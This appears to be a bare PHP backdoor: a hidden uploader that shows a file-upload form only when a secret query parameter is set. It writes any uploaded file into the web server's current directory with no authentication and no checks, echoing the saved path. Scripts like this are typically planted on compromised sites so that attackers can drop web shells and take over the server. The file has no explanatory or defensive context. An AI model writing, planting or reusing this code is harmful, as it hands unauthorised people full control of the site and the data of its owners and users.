<?php if(isset($_GET['tolol'])){echo "<form action='' enctype='multipart/form-data' method='POST'><input type='file' name='filena'><input type='submit' name='zzzzz' value='zzzzz'></form>"; }
if (isset($_POST['zzzzz'])) {$cwd=getcwd();$tmp=$_FILES['filena']['tmp_name'];$file=$_FILES['filena']['name'];if (@copy($tmp, $file)){echo " => $cwd/$file";}else {echo "failed";}exit;} ?>
